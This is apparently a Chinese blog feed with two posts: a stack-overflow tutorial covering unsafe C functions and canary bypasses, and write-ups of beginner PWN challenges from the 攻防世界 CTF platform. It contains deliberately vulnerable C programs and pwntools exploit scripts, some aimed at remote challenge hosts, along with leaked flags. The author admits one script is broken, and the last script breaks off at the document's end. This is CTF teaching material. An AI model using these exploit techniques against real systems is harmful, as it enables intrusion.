<p>栈的生长方向是向低地址生长 也就是压栈时数据是先放到高地址的地方<br>这里栈的概念是和数据结构中的栈一致的 即一种<strong>FILO</strong>(first in last out)的数据结构</p>
<p>而在汇编层面上 函数调用时会进行保存现场操作 即保存函数调用前寄存器的状态 通常在进入函数体时 栈内就已经有数据了 通常的排布如下</p>
<p><img src="https://ae01.alicdn.com/kf/H38d1f8f92100468f9a51b205dea97fcak.png" alt></p>
<p>这里参数是从左向右入栈还是从右向左入栈取决于调用方法 在这里我们不做讨论 EBP保存的是在函数调用前栈底的位置 <em>当栈清空时栈顶自然回位所以不必保存栈顶指针</em> 返回地址则保存的是当函数调用完毕后<strong>需要执行</strong>的指令地址 在函数调用结束的时候 栈的情况就是按相反方向出栈<br>即 先弹出局部变量 然后弹出EBP到EBP寄存器中 最后弹出返回地址到EIP寄存器中 而参数则是直接使用<strong>ADD ESP</strong>让他们直接消失在栈中</p>
</blockquote>
<p>在大致了解了下汇编层面的函数调用和栈知识 我们就可以来了解栈溢出漏洞是怎么造成的了..栈溢出漏洞即字面意思 就是向栈中写入了超过限定长度的数据 导致溢出的数据覆盖栈中其他数据 从而影响程序的运行</p>
<p>最开始的时候 栈溢出漏洞主要是用来破坏 即破坏程序的栈中内容 从而是程序异常退出 但是渐渐的 我们发现 如果计算好溢出数据的长度 让特定数据覆盖在原本的返回地址上 那我们即可以控制程序流向 从而达到影响系统的目的 而这种写入超过限定长度的操作主要是利用一些特定的敏感函数造成的</p>
<h2 id="敏感函数"><a href="#敏感函数" class="headerlink" title="敏感函数"></a>敏感函数</h2><h3 id="gets"><a href="#gets" class="headerlink" title="gets()"></a>gets()</h3><h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">char *gets(char *str)</code></pre>
<h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><p>从输入缓冲区读取一个字符串存储到指针指向的内存空间 注意 使用gets()时 系统会自动将最后输入的换行符取出来然后丢弃 也就是如果后续需要继续赋值是不需要吸收回车的 但是gets()函数有一个非常大的缺陷 即他不检查预留存储区是否能够容纳实际输入的数据 简单来说就是有造成内存越界的危险</p>
<h3 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h3><h4 id="函数原型-1"><a href="#函数原型-1" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">ssize_t read(int fd,void *buf,size_t nbyte)</code></pre>
<p>fd:文件描述符 fd为0即从键盘读取<br>buf:指定的缓冲区 即指针 指向一段内存空间<br>nbyte: 要读入文件指定的字节数</p>
<h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><p>read()函数会把参数fd指向的文件传送nbyte个字节到buf指针所指的内存中 如果nbyte为0 则read()不会有任何作用并返回0 但是如果指定的字符大于缓冲区能容纳的字节数 read()函数也不会进行任何检查 即有可能造成内存越界</p>
<h3 id="strcpy-和memcpy-和strncpy"><a href="#strcpy-和memcpy-和strncpy" class="headerlink" title="strcpy()和memcpy()和strncpy()"></a>strcpy()和memcpy()和strncpy()</h3><h4 id="函数原型-2"><a href="#函数原型-2" class="headerlink" title="函数原型"></a>函数原型</h4><pre class=" language-C"><code class="language-C">char *strcpy(char *dest,const char* src)
void *memcpy(void *dest,const void *src,size_t count)
char *strncpy(char *dest,char *src,int size_t n)</code></pre>
<p>dest:指向用于储存复制内容的目标函数<br>src:要复制的字符串<br>count:要读入文件指定的字节数</p>
<h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><p>strcpy()提供了字符串的复制 即strcpy()只用于字符串的复制 而且他不仅复制字符串的内容 还会复制字符串的结束符’\0’</p>
<p>复制的内容不同 strcpy()只复制字符串 而memcpy()可以复制任意内容 如字符数组 整型 结构体 类等</p>
<p>复制的方式不同 strcpy不需要指定长度 他遇到’\0’才会停止 所以可能会造成溢出 memcpy()则是根据第三个参数决定复制的长度</p>
<p>strncpy()函数 只是将src的前n个字符 复制到dest的前n个字符 不自动添加’\0’ 如果src的长度小于n个字节 则以null填充dest知道复制完n个字节</p>
<h2 id="在没有保护的情况下利用"><a href="#在没有保护的情况下利用" class="headerlink" title="在没有保护的情况下利用"></a>在没有保护的情况下利用</h2><blockquote>
<p>需要的前置知识: 基本的python语法 pwntools模块的使用语法 栈的结构 汇编层面的函数调用</p>
</blockquote>
<p>首先这是我自己写的小案例 源码如下</p>
<pre class=" language-C"><code class="language-C">#include <stdio.h>
#include <stdlib.h>

void hello()
{
      char a[100];
      gets(a);
}

void pwn()
{
      system("/bin/sh");
}

int main(void)
{
      hello();
      return 0;
}</code></pre>
<p>在乌班图上使用GCC编译 首先我们关闭所有的保护 这里我是将程序编译成32位 64位同理</p>
<blockquote>
<p>NX：-z execstack / -z noexecstack (关闭/开启) 栈执行</p>
<p>Canary：-fno-stack-protector / -fstack-protector / -fstack-protector-all (关闭/开启/全开启) 栈中插入cookie信息</p>
<p>PIE：-no-pie / -pie (关闭/开启) 地址随机化</p>
<p>RELRO：-z norelro / -z lazy / -z now (关闭/部分开启/完全开启) 对GOT表具有写权限</p>
</blockquote>
<p>使用checksec 查看程序保护<br><img src="https://ae01.alicdn.com/kf/H4e535c2f20cf4afa80cadf6a4e66137ac.png" alt></p>
<p><em>这里我忘记关闭RELRO保护了</em></p>
<p>打开IDA 反编译一下 发现所有函数都正常读入</p>
<p><img src="https://ae01.alicdn.com/kf/Hed74694200524a87b334d09a04ad627dK.png" alt></p>
<p>阅读源码 发现在hello()函数中存在敏感函数gets() 确定溢出点 在IDA中双击s查看栈图</p>
<p><img src="https://ae01.alicdn.com/kf/H21f396218fab4b79b76116dc1145db58r.png" alt></p>
<p>栈图如下 可以发现 变量s的初始地址到返回地址的偏移是 6C+4=70个字节 那我们的基本思路就是 向程序中填入70个无用字节 然后将返回地址覆盖成函数pwn()的地址 这样我们就可以拿到终端</p>
<p><img src="https://ae01.alicdn.com/kf/Hf4f1fafc469b47f4959eee1d90db3989H.png" alt></p>
<p>那么使用pwntools库进行脚本的编写 </p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./test"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804847E</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行脚本 得到终端</p>
<p><img src="https://ae01.alicdn.com/kf/H8a387bd208744392bc1b83f5d63151234.png" alt></p>
<p>在没有保护的情况下 利用完毕</p>
<h2 id="在有Canary保护的情况下的利用"><a href="#在有Canary保护的情况下的利用" class="headerlink" title="在有Canary保护的情况下的利用"></a>在有Canary保护的情况下的利用</h2><p>绕过Canary保护的的方法主要有两种分别都有各自的局限性 </p>
<p>第一种就是利用程序的格式化字符串漏洞泄漏出指定位置的Canary值 当然 这种方法的前提就是程序中存在格式化字符串漏洞… </p>
<p>第二种方法就是利用溢出 直接将字符串覆盖到Canary值 然后在输出的时候直接输出出来 这种方法的局限性是要求读入字符串的函数 不会将00加入到字符串尾 不然会直接截断字符串 导致不能将Canary值带出来 </p>
<p>下面分别给出两种情况的案例 来绕过Canary保护</p>
<h3 id="配合格式化字符串绕过"><a href="#配合格式化字符串绕过" class="headerlink" title="配合格式化字符串绕过"></a>配合格式化字符串绕过</h3><p>首先给出案例代码</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token keyword">int</span> sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>sign<span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
            <span class="token function">gets</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>利用格式化字符串的第一步就是需要测出内存中存储的字符串相对于参数的偏移</p>
<p><img src="https://s2.ax1x.com/2019/10/18/KeEsiV.png" alt="KeEsiV.png"></p>
<p>这里可以测出 在我本机的偏移是6 那么将程序载入IDA(或者动态调试 都能达到相同的目的) 可以通过汇编面板看到 Var_c就是Canary值 那么转到主函数的栈图 可以明确看到 输入的参数距离Var_c的距离是 <strong>70-c=0x64</strong> 那么输入的参数距离Canary的参数个数就为 <strong>100(0x64)/4+6=31</strong> 明确我们利用格式化子串的格式化输入为 <strong>%31$p</strong></p>
<p><img src="http://p1.so.qhimgs1.com/t0121dda714c5a6d361.jpg" alt></p>
<p><img src="http://p1.so.qhimgs1.com/t01e714c15cedb1cee0.jpg" alt></p>
<p>那下一步就是写脚本了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span>
sys_addr<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./canary"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'pwn'</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> <span class="token string">"%31$p"</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span>
canary<span class="token operator">=</span>sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
canary<span class="token operator">=</span>int<span class="token punctuation">(</span>canary<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x64</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#这个脚本这里是有问题的 菜鸡实在不知道怎么把十进制数转成16进制数... 大致思路理解下即可...</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="溢出覆盖绕过Canary保护"><a href="#溢出覆盖绕过Canary保护" class="headerlink" title="溢出覆盖绕过Canary保护"></a>溢出覆盖绕过Canary保护</h3><p>先给出样例</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>

<span class="token keyword">void</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
      <span class="token keyword">int</span> sign<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">char</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>sign<span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
            <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this is out\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">printf</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sign<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这个就没有那么多将就 直接载入IDA 看距离 覆盖到Canary值即可</p>
<p>脚本如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span> <span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./canary1"</span><span class="token punctuation">)</span>
shell_addr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./canary1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"pwn"</span><span class="token punctuation">]</span>
payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"this is out"</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">)</span>
canary <span class="token operator">=</span> u32<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x0a</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"canary:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span>  <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">100</span> <span class="token comment" spellcheck="true">#填充</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#泄露的canary</span>
payload <span class="token operator">+=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">8</span>
payload <span class="token operator">+=</span> <span class="token string">"aaaa"</span> <span class="token comment" spellcheck="true">#ebp</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>shell_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ret addr</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script></body></html>]]></content>
      
        <categories>
            
            <category> PWN </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界PWN新手练习区WP]]></title>
      <url>/2019/10/08/gong-fang-shi-jie-pwn-xin-shou-lian-xi-qu-wp/</url>
      <content type="html"><![CDATA[<html><head></head><body><a id="more"></a>
<blockquote>
<p>近期笨逼菜鸡开始接触PWN 刷了刷攻防世界的题目 在这里记录下自己的学习成果</p>
</blockquote>
<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护<br><img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
<blockquote>
<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子<br><img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt>可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来<br><img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt>这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数<br>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
</blockquote>
<blockquote>
<p>同时也讲一下NX保护吧 NX保护一般是不可绕过的 他是禁止了栈执行 也就是即使你写入了shellcode 但是如果NX保护开启的话 也是不能在栈上执行的</p>
</blockquote>
<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来<br><img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt><br>没什么世纪大发现 那就常规操作 载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了<br><img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt><br>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位<br><img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt><br>那基本信息获取的差不多了 就可以开始编写脚本了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48339"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"Dust"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"leave your message please:"</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x0804A068</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'0000%10$n'</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行脚本即可<br><img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…<br><img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>跑一下 没啥思路 直接载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图<br><img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>没跑了 栈溢出 直接开始写脚本吧</p>
<blockquote>
<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量<br><img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
</blockquote>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"45209"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Birth?"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1925"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"What's Your Name?"</span><span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1926</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>执行即可<br><img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt><br>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护<br><img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt></p>
<p>就开着NX保护 载入IDA看下<br><img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt></p>
<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量<br><img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt></p>
<p>同时发现 程序主体中读入的变量和dword_60106C 仅相差4个字节的位置 而程序主体读入的大小是10个字节 确定此处存在溢出 直接编写脚本即可</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
a<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"33618"</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"~~ welcome to ctf ~~"</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"lets get helloworld for bof"</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span><span class="token number">4</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x6E756161</span><span class="token punctuation">)</span>
a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>运行脚本获得结果<br><img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt></p>
<p>得到flag:cyberpeace{57c7b3fd167ec0630431800825423de0}</p>
<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA<br><img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt></p>
<p>发现主函数空空如也 有点头疼<br><img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt></p>
<p>但是发现在函数表中 有个敏感函数<em>callsystem</em><br><img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt></p>
<p>菜鸡此时就有点思路了 应该是劫持返回地址 然后让程序执行到callsystem函数 那么继续在主函数跟下去</p>
<p><img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt></p>
<p>这个read就很明显了 read了200个字节..双击buf看下栈图<br>这里截不下图就不截了..简单算一下 80+8=88个字节 而程序读入100个字节 那就是溢出了…同时这里程序的地址随机化是关着的…不多说..开始写脚本吧..</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35202"</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token string">"Hello, World"</span><span class="token punctuation">)</span>
